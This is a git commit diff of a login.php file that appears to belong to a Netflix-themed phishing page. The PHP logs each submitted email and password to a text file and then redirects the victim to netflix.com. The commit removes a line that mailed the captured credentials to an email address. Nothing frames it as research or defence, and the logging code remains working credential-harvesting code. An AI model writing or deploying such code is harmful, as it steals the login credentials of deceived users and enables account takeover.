da38202719c9608a0a7dd79a0e2c25c6bd49fb30
filipcl <filip.larsen@live.no>
2021-02-18 16:12:00 +0100

    add content

--- login.php
+++ login.php
@@ -1,6 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-mail("filip.larsen@live.no","FromScript","Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", "From: filip.larsen@live.no");
 header('Location: https://netflix.com');
 exit();
